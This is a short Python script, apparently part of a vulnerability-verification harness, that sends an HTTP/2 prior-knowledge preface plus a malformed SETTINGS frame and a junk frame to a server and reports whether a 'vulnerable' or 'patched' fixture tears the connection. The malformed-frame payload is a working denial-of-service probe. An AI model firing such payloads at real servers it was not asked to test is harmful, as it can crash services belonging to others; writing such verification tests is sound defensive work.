#!/usr/bin/env python3
"""Opaque payload (owner-authored). HTTP/2 preface + malformed frame differential.
usage: h2-malformed.py <variant> <base_url>
Sends prior-knowledge h2 on cleartext; expects fixture to have h2 enabled.
Emits raw evidence to stdout, then exactly one VERDICT line."""
import sys, re, socket

variant, url = sys.argv[1], sys.argv[2]
host, port = re.match(r"https?://([^:/]+):?(\d+)?", url).groups()
port = int(port or 80)
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
# SETTINGS frame (type 4) with a bogus length-3 payload, then a garbage frame
JUNK = b"\x00\x00\x03\x04\x00\x00\x00\x00\x01\x02\x03" + b"\xde\xad\xbe\xef\x00\x00\x00\x00\x00\x00"
try:
    s = socket.create_connection((host, port), timeout=8)
    s.sendall(PREFACE + JUNK)
    data = s.recv(4096)
    s.close()
    print("RESPONSE %d bytes first=%r" % (len(data), data[:64]))
    if len(data) >= 9 and data[3] == 7:  # GOAWAY frame type
        v = "# VERDICT: %s" % ("not-vulnerable GOAWAY handled cleanly" if variant == "patched"
                               else "inconclusive GOAWAY on vulnerable half (no worker loss)")
    elif data:
        v = "# VERDICT: %s" % ("not-vulnerable error response on patched half" if variant == "patched"
                               else "inconclusive response without worker loss on vulnerable half")
    else:
        v = "# VERDICT: vulnerable empty response (connection closed)"
except (ConnectionError, socket.timeout, OSError) as e:
    print("TORN %r" % e)
    v = "# VERDICT: vulnerable connection torn on h2 frame" if variant == "vulnerable" \
        else "# VERDICT: inconclusive teardown on patched half (unexpected)"
print(v)
